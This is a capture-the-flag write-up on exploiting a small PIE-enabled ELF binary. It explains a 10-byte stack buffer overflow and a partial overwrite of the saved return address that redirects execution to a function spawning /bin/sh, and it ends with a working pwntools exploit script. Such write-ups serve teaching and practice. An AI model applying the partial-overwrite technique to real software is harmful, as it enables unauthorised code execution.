# Analysis #

We're given a binary called `main`. 

`file main` 

```
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60341580e9a1c8654c6e5e7f8be2f7cfa605d964, for GNU/Linux 3.2.0, not stripped
````

`checksec main`
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We have no canary but PIE is enabled. 

# decompilation #

Using ghidra, we decompile the challenge:

`main()`
```c
undefined8 main(void)

{
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  vuln();
  return 0;
}
```


`vuln()`
```c
void vuln(void)

{
  undefined local_12 [10];
  
  read(0,local_12,170);
  return;
}
```

`bad_function()`
```c
void bad_function(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

From this we learn that: 
- `vuln()` is vulnerable to a trivial stack-based buffer overflow: it reads up to 170 characters into a 10-byte buffer.
- There's a 'win' function called `bad_function()` that gives us a shell when executed.

# Exploitation Strategy #

We can use the buffer overflow to hijack control flow and point `saved rip`, the return value of the vuln() function, to the address of `bad_function()`.

However: since **PIE** is enabled, we do not know the full address of `bad_function()` in memory when the binary is running, since the base address of the application is randomized. 

We can circumvent this randomization by doing a **partial rip overwrite**. **PIE** only randomizes the first 9 nibbles, the last 3 nibbles will always be the same. 

Looking at the `main()` function, we see the following:

```asm
        001011fc e8 88 ff        CALL       vuln            
                 ff ff
        00101201 b8 00 00        MOV        EAX,0x0
                 00 00
```

When vuln() is called, it's supposed to return to address 0xNNN201, where NNN is randomized. So the value of saved RIP on the stack is 0xNNN201. 

Now if we look at the address of bad_function:

```asm
             undefined         AL:1           <RETURN>
                             bad_function                                    XREF[3]:     Entry Point(*), 00102048, 
                                                                                          00102130(*)  
        00101208 f3 0f 1e fa     ENDBR64
```

We see that bad_function starts at address 0xNNN208. Notice that this address only differs by the least significant byte. This means that we can perform a partial overwrite and overwrite just the single 0x01 byte of the saved rip with 0x08 so it points to `bad_function()` 


# Exploit #

```python
#!/usr/bin/env python3
from pwn import *

r = process("./main")

# since PIE is enabled, we partially overwrite saved rip so it points to bad_function
payload = b"A"*18 + b"\x08" 

r.send(payload)

r.interactive()
```
